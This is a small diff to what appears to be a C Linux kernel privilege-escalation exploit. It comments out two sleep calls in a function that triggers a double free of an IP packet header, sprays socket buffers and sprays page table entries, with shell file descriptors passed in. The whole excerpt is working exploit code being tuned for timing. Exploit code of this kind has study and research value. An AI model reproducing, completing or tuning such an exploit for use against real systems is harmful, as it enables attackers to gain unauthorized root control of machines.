@@ -323,7 +323,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
 
 	//printf("some chill after 1st free");
-	sleep(3);
+	//sleep(3);
 	
 	// push N skbs to skb freelist
 	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
@@ -331,7 +331,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		recv_ipv4_udp(1);
 	}
-	sleep(3);
+	//sleep(3);
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
